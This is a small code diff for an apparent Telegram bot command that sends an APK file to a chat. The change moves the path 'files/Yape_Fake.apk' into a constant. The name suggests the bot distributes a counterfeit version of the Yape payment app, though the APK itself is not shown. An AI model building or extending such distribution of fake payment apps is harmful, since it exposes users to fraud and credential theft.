@@ -1,3 +1,4 @@
+const { LOCAL } = require('../utils/constants');
 const { sendMessage } = require('../utils/sender');
 
 function buildApkTemplate() {
@@ -44,7 +45,7 @@ function registerAppCommands(bot) {
     const chatId = msg.chat.id;
 
     try {
-      const filePath = 'files/Yape_Fake.apk';
+      const filePath = LOCAL.APK_FILE;
 
       await sendMessage(bot, chatId, {
         filePath,
